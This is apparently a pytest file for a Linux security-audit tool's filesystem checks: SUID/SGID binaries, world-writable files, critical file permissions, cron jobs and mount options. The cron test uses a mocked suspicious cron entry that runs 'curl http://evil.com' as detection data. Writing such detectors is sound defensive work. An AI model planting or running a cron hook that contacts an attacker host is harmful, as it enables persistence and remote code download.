"""Tests for the filesystem phase."""

from unittest.mock import patch

from security_audit.phases.filesystem import (
    check_critical_file_permissions,
    check_cron_jobs,
    check_mount_options,
    check_sgid_binaries,
    check_suid_binaries,
    check_world_writable_files,
    run_filesystem_checks,
)


class TestCheckSUIDBinaries:
    """Tests for check_suid_binaries."""

    @patch("security_audit.phases.filesystem.run_command")
    def test_no_dangerous_suid(self, mock_run):
        """Test when no dangerous SUID binaries found."""
        mock_run.return_value = ("/usr/bin/passwd\n/usr/bin/su", "", 0)
        findings = check_suid_binaries()
        assert len(findings) == 0

    @patch("security_audit.phases.filesystem.run_command")
    def test_dangerous_suid_found(self, mock_run):
        """Test when dangerous SUID binaries found."""
        mock_run.return_value = ("/usr/bin/bash\n/usr/bin/python", "", 0)
        findings = check_suid_binaries()
        assert len(findings) >= 1


class TestCheckSGIDBinaries:
    """Tests for check_sgid_binaries."""

    @patch("security_audit.phases.filesystem.run_command")
    def test_sgid_binaries_found(self, mock_run):
        """Test when SGID binaries found."""
        mock_run.return_value = ("/usr/bin/sgid-bin", "", 0)
        findings = check_sgid_binaries()
        assert len(findings) == 1


class TestCheckWorldWritableFiles:
    """Tests for check_world_writable_files."""

    @patch("security_audit.phases.filesystem.run_command")
    def test_world_writable_files_found(self, mock_run):
        """Test when world-writable files found."""
        mock_run.return_value = ("/tmp/test.txt\n/tmp/test2.txt", "", 0)
        findings = check_world_writable_files()
        assert len(findings) == 1


class TestCheckCriticalFilePermissions:
    """Tests for check_critical_file_permissions."""

    @patch("security_audit.phases.filesystem.run_command")
    def test_shadow_permissions_ok(self, mock_run):
        """Test when shadow file has correct permissions."""
        mock_run.side_effect = [
            ("-rw------- 1 root shadow 1000 /etc/shadow", "", 0),
            ("-rw------- 1 root root 1000 /etc/gshadow", "", 0),
            ("-r--r----- 1 root root 1000 /etc/sudoers", "", 0),
        ]
        findings = check_critical_file_permissions()
        assert len(findings) == 0

    @patch("security_audit.phases.filesystem.run_command")
    def test_shadow_permissions_weak(self, mock_run):
        """Test when shadow file has weak permissions."""
        mock_run.return_value = ("-rw-rw-rw- 1 root root 1000 /etc/shadow", "", 0)
        findings = check_critical_file_permissions()
        assert len(findings) >= 1


class TestCheckCronJobs:
    """Tests for check_cron_jobs."""

    @patch("security_audit.phases.filesystem.run_command")
    def test_suspicious_cron_found(self, mock_run):
        """Test when suspicious cron job found."""
        mock_run.side_effect = [
            (
                "drwxr-xr-x root root 4096 Jan  1 00:00 /etc/cron.d/hook  curl http://evil.com",
                "",
                0,
            ),
            ("", "", 1),
            ("", "", 1),
            ("", "", 1),
            ("", "", 1),
            ("", "", 1),
            ("", "", 1),
        ]
        findings = check_cron_jobs()
        assert len(findings) >= 1


class TestRunFilesystemChecks:
    """Tests for run_filesystem_checks."""

    @patch("security_audit.phases.filesystem.run_command")
    def test_run_filesystem_checks_returns_list(self, mock_run):
        """Test that run_filesystem_checks returns a list."""
        mock_run.return_value = ("", "", 1)
        findings = run_filesystem_checks()
        assert isinstance(findings, list)


class TestCheckMountOptions:
    """Tests for check_mount_options."""

    @patch("security_audit.phases.filesystem.run_command")
    def test_tmp_secure_mount(self, mock_run):
        """Test when /tmp is mounted with all security options."""
        mock_run.return_value = (
            "tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)",
            "",
            0,
        )
        findings = check_mount_options()
        assert not any(f.check_id == "FS-014" and "/tmp" in f.title for f in findings)

    @patch("security_audit.phases.filesystem.run_command")
    def test_tmp_missing_noexec(self, mock_run):
        """Test when /tmp is missing the noexec option."""
        mock_run.return_value = (
            "tmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime)",
            "",
            0,
        )
        findings = check_mount_options()
        assert any(f.check_id == "FS-014" for f in findings)
        assert any("noexec" in f.description for f in findings)

    @patch("security_audit.phases.filesystem.run_command")
    def test_devshm_missing_options(self, mock_run):
        """Test when /dev/shm is missing security options."""
        mock_run.return_value = (
            "tmpfs on /dev/shm type tmpfs (rw,relatime)",
            "",
            0,
        )
        findings = check_mount_options()
        assert any(f.check_id == "FS-014" and "/dev/shm" in f.title for f in findings)

    @patch("security_audit.phases.filesystem.run_command")
    def test_mount_command_fails(self, mock_run):
        """Test when mount command fails."""
        mock_run.return_value = ("", "", 1)
        findings = check_mount_options()
        assert len(findings) == 0
